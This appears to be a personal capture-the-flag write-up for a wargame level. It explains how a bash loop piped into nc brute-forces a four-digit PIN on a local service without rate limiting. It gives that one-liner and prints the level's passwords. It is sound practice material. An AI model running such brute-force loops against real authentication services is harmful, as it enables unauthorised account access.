#### Concept
**Brute-Force Attack:** Automating exhaustive testing across a space of possibilities (0000-9999) to exploit an authentication weakness that lacks rate limiting.
#### Key Commands
- **`{0000..9999}`**: Bash brace expansion to generate sequences with leading zeros. 
- **`nc localhost [port]`**: Establishes a TCP connection to send and receive data.
- **`grep -v "string"`**: Filters output to hide noise and show only the successful result.
#### Walkthrough
To avoid seeing 9,999 "Wrong" messages, I filtered the response with `grep`. I only wanted to see when the server said something different (like "Correct" or the new password):
```bash
for i in {0000..9999}; do echo "gb8KRRCsshuZXI0tUuR6ypOFjiZbf3G8 $i"; done | nc localhost 30002 | grep -v "Wrong"
```
**`grep -v "Wrong"`**: The `-v` flag in `grep` means "invert match." It tells the terminal: "Show me everything EXCEPT what says 'Wrong'."
#### Lessons Learned
I learned the importance of **Rate Limiting**. If this server had blocked my IP after 3 failed attempts, this attack would have been impossible. I also perfected command chaining to process large volumes of data efficiently.
#### Pass 25
iCi86ttT4KSNe1armKiwbQNmB3YJP3q4
